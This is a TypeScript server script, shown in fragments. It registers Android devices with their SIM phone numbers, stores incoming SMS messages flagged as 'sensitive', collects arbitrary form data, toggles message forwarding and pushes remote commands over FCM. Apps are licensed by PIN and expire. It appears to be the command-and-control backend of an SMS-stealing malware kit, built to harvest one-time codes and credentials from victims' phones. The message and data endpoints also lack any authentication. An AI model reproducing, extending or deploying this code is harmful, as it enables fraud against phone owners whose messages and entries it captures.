...
function normalizeAppId(appId: unknown): string { return String(appId ?? "").trim().toUpperCase(); }
function normalizePin(pin: unknown): string { const p = String(pin ?? DEFAULT_APP_PIN).trim(); return p || DEFAULT_APP_PIN; }
...
function normalizeDb(parsed: Partial<DataFile>): DataFile {
  ...
  const defaultIndex = apps.findIndex(a => normalizeAppId(a.appId) === DEFAULT_APP_ID);
  if (defaultIndex === -1) {
...
async function handle(request: Request, env: Env): Promise<Response> {
  ...
  if (path === "" || path === "health" || path === "healthz") return json({ ok: true, status: "running", time: Date.now() });
  ...
  if (parts[0] === "apps") {
    const appId = parts[1] ? normalizeAppId(parts[1]) : undefined;
    if (!appId && method === "GET") {
    ...
    if (!appId && method === "POST") {
      ...
      const newAppId = normalizeAppId(body.appId);
      if (!newAppId || !String(body.name ?? "").trim()) return bad("appId and name are required");
      if (db.apps.some(a => normalizeAppId(a.appId) === newAppId)) return json({ error: "App ID already exists" }, 409);
      const row: AppRow = { id: db.meta.nextAppId++, appId: newAppId, name: String(body.name).trim(), pin: normalizePin(body.pin), status: String(body.status ?? "active"), createdAt: nowIso() };
      db.apps.push(row); await saveDb(env, db); return json(row, 201);
    }
    let app = db.apps.find(a => normalizeAppId(a.appId) === appId);
    if (!app && appId === DEFAULT_APP_ID && (method === "GET" || method === "PATCH" || parts[2] === "verify-pin")) {
      app = makeDefaultApp();
      db.apps.unshift(app);
      await saveDb(env, db);
    }
    if (!app) return notFound();
    if (app.appId !== DEFAULT_APP_ID && app.status === "active" && isExpired(app.createdAt)) { app.status = "disabled"; await saveDb(env, db); }
    if (parts[2] === "verify-pin" && method === "POST") {
      ...
      if (normalizePin(app.pin) !== normalizePin(body.pin)) return json({ error: "Wrong PIN" }, 401);
      return json({ ok: true, appId: app.appId, name: app.name });
    }
    if (method === "GET") return json(app);
    if (method === "PATCH") {
      const body = await bodyJson(request);
      if (body.name !== undefined) app.name = String(body.name).trim();
      if (body.pin !== undefined) app.pin = normalizePin(body.pin);
      if (body.status !== undefined) app.status = String(body.status);
      await saveDb(env, db); return json(app);
    }
    if (method === "DELETE") { db.apps = db.apps.filter(a => normalizeAppId(a.appId) !== appId); await saveDb(env, db); return json({ ok: true }); }
  }

  if (parts[0] === "register" && method === "POST") {
    const b = await bodyJson(request);
    if (!b.appId || !b.deviceId || !b.name) return bad("appId, deviceId and name are required");
    const deviceId = String(b.deviceId); const appId = String(b.appId); const now = nowIso();
    // Auto-create app if it doesn't exist yet
    if (!db.apps.find(a => normalizeAppId(a.appId) === appId)) {
      db.apps.push({ id: db.meta.nextAppId++, appId, name: String(b.appName ?? appId), pin: "1234", status: "active", createdAt: now });
    }
    const existing = db.devices.find(d => d.deviceId === deviceId);
    const input = { appId, deviceId, userId: String(b.userId ?? `USR-${deviceId.slice(-6).toUpperCase()}`), name: String(b.name), androidVersion: Number(b.androidVersion ?? 0), sim1Carrier: b.sim1Carrier != null ? String(b.sim1Carrier) : null, sim1Phone: b.sim1Phone != null ? String(b.sim1Phone) : null, sim2Carrier: b.sim2Carrier != null ? String(b.sim2Carrier) : null, sim2Phone: b.sim2Phone != null ? String(b.sim2Phone) : null, fcmToken: b.fcmToken != null ? String(b.fcmToken) : null, status: "online", lastOnline: now, forwardEnabled: false };
  ...
  if (parts[0] === "devices") {
    ...
    if (method === "PATCH") {
      const b = await bodyJson(request);
      if (b.status !== undefined) d.status = String(b.status);
      if (b.lastOnline !== undefined) d.lastOnline = String(b.lastOnline);
      if (b.fcmToken !== undefined) d.fcmToken = String(b.fcmToken);
      if (b.forwardEnabled !== undefined) d.forwardEnabled = Boolean(b.forwardEnabled);
      d.updatedAt = nowIso(); await saveDb(env, db); return json(d);
    }
  }
  if (parts[0] === "messages") {
    if (method === "GET") {
      const appId = url.searchParams.get("appId"); const userId = url.searchParams.get("userId"); const deviceId = url.searchParams.get("deviceId");
      return json(db.messages.filter(m => appId ? m.appId === appId : userId ? m.userId === userId : deviceId ? m.deviceId === deviceId : true).sort((a,b)=>b.receivedAt.localeCompare(a.receivedAt)));
    }
    if (method === "POST") {
      const b = await bodyJson(request);
      if (!b.appId || !b.deviceId || !b.fromNumber || !b.body) return bad("appId, deviceId, fromNumber and body are required");
      const row: MessageRow = { id: db.meta.nextMessageId++, appId: String(b.appId), deviceId: String(b.deviceId), userId: String(b.userId ?? `USR-${String(b.deviceId).slice(-6).toUpperCase()}`), fromSender: String(b.fromSender ?? "Unknown"), fromNumber: String(b.fromNumber), body: String(b.body), isSensitive: Boolean(b.isSensitive ?? false), receivedAt: nowIso() };
      db.messages.push(row); await saveDb(env, db); return json({ ok: true, id: row.id }, 201);
    }
  }
  if (parts[0] === "data") {
    if (method === "GET") {
      const appId = url.searchParams.get("appId"); if (!appId) return bad("appId is required");
      const deviceId = url.searchParams.get("deviceId");
      return json(db.formData.filter(f => f.appId === appId && (!deviceId || f.deviceId === deviceId)).sort((a,b)=>b.submittedAt.localeCompare(a.submittedAt)));
    }
    if (method === "POST") {
      const b = await bodyJson(request);
      if (!b.appId || !b.deviceId) return bad("appId and deviceId are required");
      if (!b.data || typeof b.data !== "object" || Array.isArray(b.data)) return bad("data must be a JSON object");
      const row: FormDataRow = { id: db.meta.nextFormDataId++, appId: String(b.appId), deviceId: String(b.deviceId), data: b.data as Record<string, unknown>, submittedAt: nowIso() };
      db.formData.push(row); await saveDb(env, db); return json(row, 201);
    }
    if (method === "DELETE" && parts[1]) {
      const id = Number(parts[1]); db.formData = db.formData.filter(f => f.id !== id); await saveDb(env, db); return json({ ok: true });
    }
  }
  if (parts[0] === "stats" && method === "GET") {
    const appId = url.searchParams.get("appId");
    return json(appId ? { devices: db.devices.filter(d=>d.appId===appId).length, messages: db.messages.filter(m=>m.appId===appId).length, formData: db.formData.filter(f=>f.appId===appId).length } : { apps: db.apps.length, devices: db.devices.length, messages: db.messages.length, formData: db.formData.length });
  }
  if (parts[0] === "sample" && method === "GET") {
    const appId = url.searchParams.get("appId");
    return json(appId ? { devices: db.devices.find(d=>d.appId===appId) ?? null, messages: db.messages.find(m=>m.appId===appId) ?? null, formData: db.formData.find(f=>f.appId===appId) ?? null } : { apps: db.apps[0] ?? null, devices: db.devices[0] ?? null, messages: db.messages[0] ?? null, formData: db.formData[0] ?? null });
  }
  if (parts[0] === "seed" && method === "POST") {
    return json({ ok: true, message: "Local database is ready" });
  }
  if (parts[0] === "admin" && parts[1] === "sessions") {
    ...
    if (!parts[2] && method === "POST") {
      const ua = request.headers.get("user-agent") ?? ""; const now = nowIso();
      const s: AdminSession = { id: randomId(), loginTime: now, lastActive: now, userAgent: ua, ip: request.headers.get("cf-connecting-ip") ?? request.headers.get("x-forwarded-for") ?? "unknown", device: parseDevice(ua) };
      sessions.push(s); await saveSessions(env, sessions); return json({ sessionId: s.id });
    }
  ...
  if (parts[0] === "fcm" && method === "POST") {
    if (parts[1] === "send") {
      const b = await bodyJson(request);
      if (!b.deviceId) return bad("deviceId is required");
      if (!b.data || typeof b.data !== "object") return bad("data object is required");
      const d = db.devices.find(x => x.deviceId === String(b.deviceId)); if (!d) return notFound();
      if (!d.fcmToken) return json({ error: "Device has no FCM token registered" }, 422);
      try {
        const sent = await sendFcm(env, d.fcmToken, Object.fromEntries(Object.entries(b.data as Record<string, unknown>).map(([k,v]) => [k, String(v)])));
        return json({ success: true, messageId: (sent as Record<string,unknown>).name ?? "sent" });
      } catch (e: unknown) {
        const err = e as { status?: number; body?: unknown; message?: string };
        return json({ error: err.body ?? err.message }, err.status ?? 500);
      }
    }
    if (parts[1] === "online-check") {
      const b = await bodyJson(request); if (!b.token) return bad("token is required");
      try {
        const safeData = Object.fromEntries(Object.entries((b.data as Record<string, unknown>) ?? { type: "online_check" }).map(([k,v]) => [k, String(v)]));
        const sent = await sendFcm(env, String(b.token), safeData);
        return json({ success: true, messageId: (sent as Record<string,unknown>).name ?? "sent" });
      } catch (e: unknown) {
        const err = e as { status?: number; body?: unknown; message?: string };
        return json({ error: err.body ?? err.message }, err.status ?? 500);
